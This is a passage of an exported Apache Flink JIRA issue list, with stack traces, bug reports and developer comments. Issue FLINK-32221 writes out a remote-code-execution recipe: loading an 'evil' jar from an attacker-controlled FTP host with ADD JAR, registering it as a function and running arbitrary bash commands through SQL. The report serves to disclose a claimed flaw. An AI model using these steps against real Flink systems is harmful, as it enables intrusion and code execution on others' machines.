org.apache.flink.streaming.runtime.io.checkpointing.SingleCheckpointBarrierHandler$ControllerImpl.triggerGlobalCheckpoint:493
org.apache.flink.streaming.runtime.io.checkpointing.SingleCheckpointBarrierHandler.access$100:64
org.apache.flink.streaming.runtime.io.checkpointing.SingleCheckpointBarrierHandler.triggerCheckpoint:287
org.apache.flink.streaming.runtime.io.checkpointing.CheckpointBarrierHandler.notifyCheckpoint:147
org.apache.flink.streaming.runtime.tasks.StreamTask.triggerCheckpointOnBarrier:1198
org.apache.flink.streaming.runtime.tasks.StreamTask.performCheckpoint:1241
org.apache.flink.streaming.runtime.tasks.StreamTaskActionExecutor$1.runThrowing:50
org.apache.flink.streaming.runtime.tasks.StreamTask$$Lambda$1453/0x000000080128e840.run:-1
org.apache.flink.streaming.runtime.tasks.StreamTask.lambda$performCheckpoint$12:1253
org.apache.flink.streaming.runtime.tasks.SubtaskCheckpointCoordinatorImpl.checkpointState:300
org.apache.flink.streaming.runtime.tasks.RegularOperatorChain.prepareSnapshotPreBarrier:89
org.apache.flink.streaming.runtime.operators.sink.SinkWriterOperator.prepareSnapshotPreBarrier:165
org.apache.flink.connector.base.sink.writer.AsyncSinkWriter.flush:494
org.apache.flink.connector.base.sink.writer.AsyncSinkWriter.yieldIfThereExistsInFlightRequests:503
org.apache.flink.streaming.runtime.tasks.mailbox.MailboxExecutorImpl.yield:84
org.apache.flink.streaming.runtime.tasks.mailbox.TaskMailboxImpl.take:149
java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await:2211
java.util.concurrent.locks.LockSupport.parkNanos:234
jdk.internal.misc.Unsafe.park:-2 {code}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Oct 18 08:18:09 UTC 2023,,,,,,,,,,"0|z1i8vk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"01/Jun/23 18:25;chalixar;Hi [~antoniovespoli] thanks for reporting the issue. 
I will be looking into it as early as next week.  As you mentioned these form of deadlocks could be caused due to silent failures of the sdk client when submitting the records.
while I understand this is a hard case to reproduce, It would be great if you could update ticket with any info found in operation.;;;","18/Oct/23 08:18;dannycranmer;Merged commit [{{37975ca}}|https://github.com/apache/flink-connector-aws/commit/37975ca22b088a61ccdc2ed6095e0e1455b5744d] into apache:v3.0

Merged commit [{{bb71f97}}|https://github.com/apache/flink-connector-aws/commit/bb71f9725f601b2ad6572aa5c8e133944b617a9e] into apache:main;;;",,,,,,,,,,,,,,,,,,,,,
Implement metrics and logging for Initial implementation,FLINK-32229,13538263,13404461,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,burakoz,liangtl,liangtl,31/May/23 12:35,04/Jun/24 10:56,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"Add/Ensure Kinesis specific metrics for MillisBehindLatest/numRecordsIn are published.

More metrics here: [https://cwiki.apache.org/confluence/display/FLINK/FLIP-33%3A+Standardize+Connector+Metrics]",,,,,,,,,,FLINK-31813,,FLINK-31989,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 04 10:56:50 UTC 2024,,,,,,,,,,"0|z1i8ug:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 12:13;chalixar;I would love to work on this JIRA;;;","04/Jun/24 10:56;hong;[~chalixar] sorry I didn't manage to see this, and [~burakoz] has requested to work on this. Could this be worked out between you and [~burakoz] ? Maybe we can collaborate by reviewing the PR?;;;",,,,,,,,,,,,,,,,,,,,,
Bump testcontainers to 1.18.2,FLINK-32228,13538262,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,snuyanzin,eskabetxe,eskabetxe,31/May/23 12:28,03/Nov/23 09:06,04/Jun/24 20:41,27/Jun/23 07:28,,,,,,,,,,,,,,,jdbc-3.1.1,jdbc-3.2.0,opensearch-1.1.0,,,,Connectors / JDBC,,,,0,pull-request-available,,,Bump testcontainers version,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 31 19:32:33 UTC 2023,,,,,,,,,,"0|z1i8u8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"31/May/23 19:32;Sergey Nuyanzin;Merged to flink-connector-jdbc:  [7a18a94bc2fbe5a0495406a6565486018eb18781|https://github.com/apache/flink-connector-jdbc/commit/7a18a94bc2fbe5a0495406a6565486018eb18781];;;",,,,,,,,,,,,,,,,,,,,,,
Optimize code styles,FLINK-32227,13538256,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,,zhihao song,zhihao song,31/May/23 11:40,15/Jun/23 09:14,04/Jun/24 20:41,15/Jun/23 09:14,,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 09:14:38 UTC 2023,,,,,,,,,,"0|z1i8sw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"02/Jun/23 03:02;masteryhx;Hi, [~zhihao song] Could you add more description about it?
e.g. Where you want to optimize and Why. How do you want to do.;;;","15/Jun/23 09:14;Weijie Guo;Closed as no response.;;;",,,,,,,,,,,,,,,,,,,,,
RestClusterClient leaks jobgraph file if submission fails,FLINK-32226,13538254,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,chesnay,chesnay,chesnay,31/May/23 11:32,01/Jun/23 09:06,04/Jun/24 20:41,01/Jun/23 09:06,1.17.0,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,Client / Job Submission,,,,0,pull-request-available,,,"{code:java}
        submissionFuture
                .thenCompose(ignored -> jobGraphFileFuture)
                .thenAccept(
                        jobGraphFile -> {
                            try {
                                Files.delete(jobGraphFile);
                            } catch (IOException e) {
                                LOG.warn(""Could not delete temporary file {}."", jobGraphFile, e);
                            }
                        });
{code}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 01 09:06:21 UTC 2023,,,,,,,,,,"0|z1i8sg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"01/Jun/23 09:06;chesnay;master: d90a72da2fd601ca4e2a46700e91ec5b348de2ad
1.17: e5fb97e305d6f23bdd0fae6484cb2f6c5c2dcd1d;;;",,,,,,,,,,,,,,,,,,,,,,
merge task deployment related fields into a new configuration ,FLINK-32225,13538250,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,huwh,huwh,huwh,31/May/23 10:54,15/Jun/23 07:01,04/Jun/24 20:41,15/Jun/23 06:58,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"As discussed in https://github.com/apache/flink/pull/22674

TaskDeploymentDescriptorFactory#fromExecution needs to retrieve several fields from the ExecutionGraphAccessor.  We could introduce a new TaskDeploymentDescriptorConfiguration to merge all these fields to make the EG/TaskDeploymentDescriptor more readable.
",,,,,,,,,,,,FLINK-32201,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 06:58:20 UTC 2023,,,,,,,,,,"0|z1i8rk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 06:58;wanglijie;Done via master(1.18): a745c146a35cf2be65c1afc61ec520b2e4d82220 ;;;",,,,,,,,,,,,,,,,,,,,,,
Unable to connect multiple host using RabbitMQ Connector,FLINK-32224,13538236,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,someshwar.reddy,someshwar.reddy,31/May/23 09:41,06/Jun/23 07:08,04/Jun/24 20:41,,1.14.2,,,,,,,,,,,,,,,,,,,,Connectors/ RabbitMQ,,,,0,,,,"i have used same implemention provided in below link
[https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/datastream/rabbitmq/]

when i using with multiple host with comma separated get below issue 
 

at org.apache.flink.streaming.connectors.rabbitmq.RMQSource.open(RMQSource.java:267)
    at org.apache.flink.api.common.functions.util.FunctionUtils.openFunction(FunctionUtils.java:34)
    at org.apache.flink.streaming.api.operators.AbstractUdfStreamOperator.open(AbstractUdfStreamOperator.java:100)
    at org.apache.flink.streaming.runtime.tasks.RegularOperatorChain.initializeStateAndOpenOperators(RegularOperatorChain.java:110)
    at org.apache.flink.streaming.runtime.tasks.StreamTask.restoreGates(StreamTask.java:711)
    at org.apache.flink.streaming.runtime.tasks.StreamTaskActionExecutor$SynchronizedStreamTaskActionExecutor.call(StreamTaskActionExecutor.java:100)
    at org.apache.flink.streaming.runtime.tasks.StreamTask.restoreInternal(StreamTask.java:687)
    at org.apache.flink.streaming.runtime.tasks.StreamTask.restore(StreamTask.java:654)
    at org.apache.flink.runtime.taskmanager.Task.runWithSystemExitMonitoring(Task.java:958)
    at org.apache.flink.runtime.taskmanager.Task.restoreAndInvoke(Task.java:927)
    at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:766)
    at org.apache.flink.runtime.taskmanager.Task.run(Task.java:575)
    at java.base/java.lang.Thread.run(Thread.java:834)
Caused by: java.net.UnknownHostException: No such host is known (10.43.2.678,10.36.2.254,10.36.2.255)
    at java.base/java.net.Inet6AddressImpl.lookupAllHostAddr(Native Method)
    at java.base/java.net.InetAddress$PlatformNameService.lookupAllHostAddr(InetAddress.java:928)
    at java.base/java.net.InetAddress.getAddressesFromNameService(InetAddress.java:1514)
    at java.base/java.net.InetAddress$NameServiceAddresses.get(InetAddress.java:847)
    at java.base/java.net.InetAddress.getAllByName0(InetAddress.java:1504)
    at java.base/java.net.InetAddress.getAllByName(InetAddress.java:1363)
    at java.base/java.net.InetAddress.getAllByName(InetAddress.java:1297)
    at com.rabbitmq.client.DnsRecordIpAddressResolver.resolveIpAddresses(DnsRecordIpAddressResolver.java:83)
    at com.rabbitmq.client.DnsRecordIpAddressResolver.getAddresses(DnsRecordIpAddressResolver.java:73)
    at com.rabbitmq.client.impl.recovery.RecoveryAwareAMQConnectionFactory.newConnection(RecoveryAwareAMQConnectionFactory.java:58)
    at com.rabbitmq.client.impl.recovery.AutorecoveringConnection.init(AutorecoveringConnection.java:156)
    at com.rabbitmq.client.ConnectionFactory.newConnection(ConnectionFactory.java:1130)
    at com.rabbitmq.client.ConnectionFactory.newConnection(ConnectionFactory.java:1087)
    at com.rabbitmq.client.ConnectionFactory.newConnection(ConnectionFactory.java:1045)
    at com.rabbitmq.client.ConnectionFactory.newConnection(ConnectionFactory.java:1207)
    at org.apache.flink.streaming.connectors.rabbitmq.RMQSource.setupConnection(RMQSource.java:204)
    at org.apache.flink.streaming.connectors.rabbitmq.RMQSource.open(RMQSource.java:240)
    ... 12 more!MicrosoftTeams-image (59).png!",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,java,Tue Jun 06 07:08:53 UTC 2023,,,,,,,,,,"0|z1i8og:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 12:48;martijnvisser;[~someshwar.reddy] I don't think there is support for multiple hosts in the RabbitMQ connector. I'm not even sure that is a feature that RabbitMQ supports, but given that the Flink RabbitMQ connector is really old and not maintained, I wouldn't be surprised if that's just missing. ;;;","06/Jun/23 06:57;someshwar.reddy;Flink RabbitMQ connector project is deprecated ?
is there any alternate connector ?;;;","06/Jun/23 07:08;martijnvisser;[~someshwar.reddy] It's not deprecated, but there are no maintainers for the project at this moment;;;",,,,,,,,,,,,,,,,,,,,
Add Hive delegation token support ,FLINK-32223,13538230,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,jiaoqb,jiaoqb,jiaoqb,31/May/23 09:04,22/May/24 08:23,04/Jun/24 20:41,29/Sep/23 08:31,,,,,,,,,,,,,,,1.19.0,,,,,,Connectors / Hadoop Compatibility,,,,0,pull-request-available,stale-assigned,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Aug/23 02:18;jiaoqb;image-2023-08-03-10-18-56-029.png;https://issues.apache.org/jira/secure/attachment/13061882/image-2023-08-03-10-18-56-029.png","03/Aug/23 02:24;jiaoqb;image-2023-08-03-10-24-53-860.png;https://issues.apache.org/jira/secure/attachment/13061884/image-2023-08-03-10-24-53-860.png","03/Aug/23 02:21;jiaoqb;screenshot-1.png;https://issues.apache.org/jira/secure/attachment/13061883/screenshot-1.png","03/Aug/23 03:38;jiaoqb;screenshot-2.png;https://issues.apache.org/jira/secure/attachment/13061886/screenshot-2.png","03/Aug/23 03:38;jiaoqb;screenshot-3.png;https://issues.apache.org/jira/secure/attachment/13061887/screenshot-3.png",,,,,,,,,,,,,,5.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Sep 30 12:31:09 UTC 2023,,,,,,,,,,"0|z1i8n4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"31/Jul/23 09:07;gaborgsomogyi;70e6359 on master;;;","01/Aug/23 06:51;mapohl;[~gaborgsomogyi] [~jiaoqb] I'm reopening the issue. It introduced a compilation error on {{master}} in the {{hadoop_313}} stage. I'm not reverting it for now because it's only appearing in the nightly builds. I will go ahead and revert the change by the end of the day if there's no fix provided by then.;;;","01/Aug/23 06:52;mapohl;That said, was this issue confirmed by the release managers? I'm asking because 1.18 feature freeze is already active since last week.;;;","01/Aug/23 07:00;renqs;I can't find any confirmation from RMs about this issue on mailing list. ;;;","01/Aug/23 10:43;gaborgsomogyi;[~mapohl]

> It introduced a compilation error on master in the hadoop_313 stage
Not sure why not seen it on the azure 🤔

> was this issue confirmed by the release managers?
Nope, sorry for that. I think it's better to revert it and postpone it to next release since it's not essential.;;;","01/Aug/23 10:51;mapohl;Thanks for the quick response. :-) I created [a PR|https://github.com/apache/flink/pull/23114] to revert the change. I'm gonna update the Jira's meta data after the revert PR is merged.

{quote}
Not sure why not seen it on the azure 🤔
{quote}
{{hadoop_313}} stage is not enabled in the PR CI (it's only executed as part of the nightly builds).;;;","01/Aug/23 11:14;gaborgsomogyi;Thanks for taking care, approved the revert.

> hadoop_313 stage is not enabled in the PR CI (it's only executed as part of the nightly builds).
How can one double check that before merge not to break things?
;;;","01/Aug/23 13:33;mapohl;I merged the revert into {{master}} and updated the Jira issues description (lowered priority and removed fixVersion).

master: 8386ef57ca5667588d0db0f19a335ef4c30094a7 (revert);;;","01/Aug/23 13:42;mapohl;{quote}
How can one double check that before merge not to break things?
{quote}

you could enable the stage in your PR if you need to have this extra assurance. You would have to update [apache/flink:./azure-pipelines.yml|https://github.com/apache/flink/blob/9b63099964b36ad9d78649bb6f5b39473e0031bd/azure-pipelines.yml] (if you have your own Azure account set up and attached to your Github Flink fork) or [apache-flink:./tools/azure-pipelines/build-apache-repo.yml|https://github.com/apache/flink/blob/9b63099964b36ad9d78649bb6f5b39473e0031bd/tools/azure-pipelines/build-apache-repo.yml] (if you want to have it be listed in the CI build that's added by CiBot to your build). The corresponding stage can be copied over from the nightly run config (see the latter yaml file) to the yaml configuration you want to modify.

You might want to do the config change in a separate commit so that it's easy to drop this commit before merging the PR to {{master}}. See [ce9264b0|https://github.com/apache/flink/pull/23117/commits/ce9264b05678dad2696a23c68d15df5864e319e7] as an example commit that enabled adaptive scheduler in the PR CI run.;;;","02/Aug/23 08:21;gaborgsomogyi;Thanks for the detailed step-by-step!
Sounds complicated, maybe compiling w/ hadoop 3.1.3 is easier. [~jiaoqb] could you plz double check what has not compiled?;;;","02/Aug/23 08:43;jiaoqb;Ok, I'll see on my environment why it failed to compile;;;","03/Aug/23 02:23;jiaoqb; !image-2023-08-03-10-24-53-860.png! 

I use the same mvn configuration as cron_hadoop313, the command is as follows
  mvn clean install -DskipTests -Dfast -Pskip-webui-build -Dflink.hadoop.version=3.2.3 -Phadoop3-tests,hive3 -T 1C

Found a compilation error

 !screenshot-1.png! 


When using -Phive3, hive.version is set to 3.1.3, and org.apache.hadoop.hive.thriftDelegationTokenIdentifier does not exist in hive-exec-3.1.3, so the compilation failed;;;","03/Aug/23 03:38;jiaoqb;Is it possible to create a HiveServer2DelegationTokenIdentifier class in the following directory

 !screenshot-2.png! 

the content is exactly the same as org.apache.hadoop.hive.thrift.DelegationTokenIdentifier as shown below

 !screenshot-3.png! 

[~gaborgsomogyi] WDYT？
;;;","20/Sep/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","29/Sep/23 08:31;gaborgsomogyi; e4c15aa on master;;;","29/Sep/23 11:49;gaborgsomogyi;The normal build passed against master: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=53521&view=results
Waiting on nightly...;;;","30/Sep/23 12:31;gaborgsomogyi;I've just double checked and before this commit HybridShuffleITCase was flaky here: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=53509&view=logs&j=5c8e7682-d68f-54d1-16a2-a09310218a49&t=86f654fa-ab48-5c1a-25f4-7e7f6afb9bba&l=8993

After the merge one can see the same issue: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=53525&view=logs&j=5c8e7682-d68f-54d1-16a2-a09310218a49&t=86f654fa-ab48-5c1a-25f4-7e7f6afb9bba&l=8701

The previously problematic hadoop_313 stage now passed. I consider that this looks good. If somebody sees an issue plz ping.;;;",,,,,,
Cassandra Source uses DataInputDeserializer and DataOutputSerializer non public apis,FLINK-32222,13538224,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,echauchot,echauchot,echauchot,31/May/23 08:50,12/Jun/23 13:11,04/Jun/24 20:41,12/Jun/23 13:11,,,,,,,,,,,,,,,cassandra-3.2.0,,,,,,,,,,0,pull-request-available,,,"in class _CassandraSplitSerializer,_ these non public APIs usage __ violate

_ConnectorRules#CONNECTOR_CLASSES_ONLY_DEPEND_ON_PUBLIC_API_",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 12 13:11:24 UTC 2023,,,,,,,,,,"0|z1i8ls:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 13:11;echauchot;merged master: 4f1cdfa;;;",,,,,,,,,,,,,,,,,,,,,,
Attacker can achieve Remote Code Execution when they can control Flink SQL script content ,FLINK-32221,13538205,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,,ziven0615,ziven0615,31/May/23 07:25,05/Jun/23 13:19,04/Jun/24 20:41,05/Jun/23 13:19,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"Flink SQL script has similiar syntax with tradition SQL, which means it also suffer SQL injection vulnerbility. 

Attacker can achieve Remote Code Execution when they can control part of whole of the Flink SQL script content by following steps.

1. attacker develop an evil custom Scalar Function class and package it into jar.

!image-2023-05-31-14-59-50-875.png|width=721,height=251!

2. run a ftp server on attacker host, and put the evil jar in it.

 
{code:java}
// install python-ftp-server tool
pip install python-ftp-server
// run ftp server
python3 -m python_ftp_server -d . --ip <attacker-public-interface ip> -p password
// copy evil jar to current directory
cp <evil.jar-path> .{code}
3. Input the Flink SQL script to trigger code execution, which assumes that the attacker can control part or whole of the Flink SQL script through SQL injection or other method.

 

 
{code:java}
// transfer the evil jar from attacker host to victim
ADD JAR 'ftp://user:password@<attacker-ip>:60000/evil.jar';
// register the evil function into the SQL context
CREATE FUNCTION EVIL AS 'org.example.Evil';
// run any bash command 
SELECT EVIL('<bash command>'); {code}
 

 

In summary, this vulnerbility allows attacker get remote code execution through Flink SQL script. After looking at several websites that use flink, it is very common to concat user input into Flink SQL statements, or even directly allow users to enter arbitrary Flink SQL scripts to process data. 

I allow that it is not a vulnerability to execute malicious code through Flink's web interface to submit a malicious jar package, because developers will hide Flink's web interface by default, such as only listening to localhost. However, malicious code execution through Flink SQL scripts is completely different. Currently, there is no hardening method or default configuration that can prevent attackers from using Flink SQL to achieve arbitrary code execution.

Suggestion:

'ADD JAR' command should not be able to load remote jar, or it should be disable by default at least.",all version that support SQL Script.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/May/23 06:58;ziven0615;image-2023-05-31-14-58-21-800.png;https://issues.apache.org/jira/secure/attachment/13058667/image-2023-05-31-14-58-21-800.png","31/May/23 06:59;ziven0615;image-2023-05-31-14-59-50-875.png;https://issues.apache.org/jira/secure/attachment/13058666/image-2023-05-31-14-59-50-875.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 31 11:35:17 UTC 2023,,,,,,,,,,"0|z1i8hk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"31/May/23 07:38;martijnvisser;[~ziven0615] Looking at https://flink.apache.org/security/ and that Flink by nature allowing for remote code execution, I don't think this is a security vulnerability. ;;;","31/May/23 07:57;ziven0615;[~martijnvisser] Thanks for your response. The Flink SQL should be used to process data.  But through this way, attacker can execute arbitrary code. By the way , is it a normal function to load remote jar package through ftp protocal, I didn't find any description about ftp in the document.;;;","31/May/23 08:06;martijnvisser;[~ziven0615] If an attacker can execute SQL code, the attacker can most likely also access the Flink REST API and upload a JAR there. I'm not aware that FTP is supported (I believe it needs to be a filesystem implementation, so either file, S3 or HDFS etc). ;;;","31/May/23 08:30;ziven0615;[~martijnvisser] Actually, attacker can't access the Flink Rest API directly in most situation, because it is suggested to only listen on localhost rather than public interface IP.  But ouside user input strings usually concat into the Flink SQL, which is a normal use case when developer use flink. It is simliar with SQL injection. This means the attacker may execute SQL code without accessing the Flink REST API. ;;;","31/May/23 11:35;martijnvisser;[~ziven0615] How can an attacker submit a SQL query to a Flink instance that he can't access?;;;",,,,,,,,,,,,,,,,,,
Improving the adaptive local hash agg code to avoid get value from RowData repeatedly,FLINK-32220,13538200,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,lsy,lsy,lsy,31/May/23 06:40,06/Jun/23 02:12,04/Jun/24 20:41,06/Jun/23 02:12,1.17.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 06 02:12:05 UTC 2023,,,,,,,,,,"0|z1i8gg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 02:12;jark;Fixed in master: 3046875c7aa0501f9a67f280034a74ea107315e3;;;",,,,,,,,,,,,,,,,,,,,,,
SQL client hangs when executing EXECUTE PLAN,FLINK-32219,13538176,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,qingyue,xu_shuai_,xu_shuai_,31/May/23 03:01,13/Jun/23 07:26,04/Jun/24 20:41,08/Jun/23 02:12,1.17.1,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,Table SQL / Client,,,,0,pull-request-available,,,"I compiled a plan for an INSERT statement and executed the plan, but the SQL client became unresponsive when executing the EXECUTE PLAN statement. I confirmed that the Flink job is running normally by checking the Flink dashboard. The only issue is that the SQL client becomes stuck and cannot accept new commands. I printed the stack trace of the SQL client process, and here is a part of it for reference.
{code:java}
""pool-2-thread-1"" #30 prio=5 os_prio=31 tid=0x00000001172e5000 nid=0x6d03 waiting on condition [0x0000000173e01000]
   java.lang.Thread.State: WAITING (parking)
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0x000000076e72af20> (a java.util.concurrent.CompletableFuture$Signaller)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
	at java.util.concurrent.CompletableFuture$Signaller.block(CompletableFuture.java:1707)
	at java.util.concurrent.ForkJoinPool.managedBlock(ForkJoinPool.java:3323)
	at java.util.concurrent.CompletableFuture.waitingGet(CompletableFuture.java:1742)
	at java.util.concurrent.CompletableFuture.get(CompletableFuture.java:1908)
	at org.apache.flink.table.api.internal.InsertResultProvider.hasNext(InsertResultProvider.java:83)
	at org.apache.flink.table.api.internal.InsertResultProvider.access$200(InsertResultProvider.java:37)
	at org.apache.flink.table.api.internal.InsertResultProvider$Iterator.hasNext(InsertResultProvider.java:106)
	at java.util.Iterator.forEachRemaining(Iterator.java:115)
	at org.apache.flink.util.CollectionUtil.iteratorToList(CollectionUtil.java:115)
	at org.apache.flink.table.gateway.service.result.ResultFetcher.fromTableResult(ResultFetcher.java:163)
	at org.apache.flink.table.gateway.service.operation.OperationExecutor.callOperation(OperationExecutor.java:542)
	at org.apache.flink.table.gateway.service.operation.OperationExecutor.executeOperation(OperationExecutor.java:440)
	at org.apache.flink.table.gateway.service.operation.OperationExecutor.executeStatement(OperationExecutor.java:195)
	at org.apache.flink.table.gateway.service.SqlGatewayServiceImpl.lambda$executeStatement$1(SqlGatewayServiceImpl.java:212)
	at org.apache.flink.table.gateway.service.SqlGatewayServiceImpl$$Lambda$389/1391083077.apply(Unknown Source)
	at org.apache.flink.table.gateway.service.operation.OperationManager.lambda$submitOperation$1(OperationManager.java:119)
	at org.apache.flink.table.gateway.service.operation.OperationManager$$Lambda$390/208625838.call(Unknown Source)
	at org.apache.flink.table.gateway.service.operation.OperationManager$Operation.lambda$run$0(OperationManager.java:258)
	at org.apache.flink.table.gateway.service.operation.OperationManager$Operation$$Lambda$392/670621032.run(Unknown Source)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:750)
{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-31956,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 07 02:02:54 UTC 2023,,,,,,,,,,"0|z1i8b4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 01:52;qingyue;Hi, [~xu_shuai_] Thanks for reporting this issue.

OperationExecutor failed to consider the types of CompileAndExecutePlanOperation and ExecutePlanOperation and instead used callOperation by default, resulting in no job ID being returned. I'd like to fix this issue. cc [~shengkai] ;;;","07/Jun/23 02:02;fsk119;Merged into master: 83ba6b5348cbffb26e8d1d5ce6e8d6bb1994e3bc
Merged into release-1.17: be53133546d054e282c0a24bfe722d0d276f9a8f;;;",,,,,,,,,,,,,,,,,,,,,
Implement support for parent/child shard ordering,FLINK-32218,13538115,13404461,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
